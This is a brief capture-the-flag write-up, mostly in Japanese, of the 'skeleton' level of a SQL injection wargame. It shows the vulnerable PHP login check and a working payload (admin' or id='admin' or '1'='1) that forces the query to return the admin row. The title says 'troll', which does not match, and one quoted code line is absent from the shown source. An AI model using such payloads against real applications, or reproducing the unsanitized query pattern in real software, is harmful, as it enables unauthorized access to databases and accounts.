# troll

## answer

```
https://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=admin%27%20or%20id=%27admin%27%20or%20%271%27=%271
```

## problem

```
query : select id from prob_skeleton where id='guest' and pw='' and 1=0

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=1
```

とすると

```
query : select id from prob_skeleton where id='guest' and pw='1' and 1=0
```

となった。

コードを読んでいく。

```
if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
```

クリア条件は

```
if($result['id'] == 'admin') solve("skeleton"); 
```

なので、無理矢理idをadminできないかと適当にやってたら、

```
https://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=admin%27%20or%20id=%27admin%27%20or%20%271%27=%271
```

```
query : select id from prob_skeleton where id='guest' and pw='admin' or id='admin' or '1'='1' and 1=0

SKELETON Clear!
```

解けた。


```
?pw=admin' or id='admin' or '1'='1
```


## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [エラー制御演算子 | php manual](https://www.php.net/manual/ja/language.operators.errorcontrol.php)

- [ereg | php manual](https://www.php.net/manual/ja/function.ereg.php)

- [文字列検索での大文字小文字の区別 | mysql manual](https://dev.mysql.com/doc/refman/5.6/ja/case-sensitivity.html)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)
